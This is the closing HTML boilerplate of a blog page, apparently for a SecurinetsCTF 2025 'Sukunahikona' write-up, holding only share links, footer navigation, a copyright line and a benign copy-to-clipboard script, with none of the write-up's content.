  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/10/06/sv8/&name=SecurinetsCTF 2025 Sukunahikona&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/10/06/sv8/&t=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
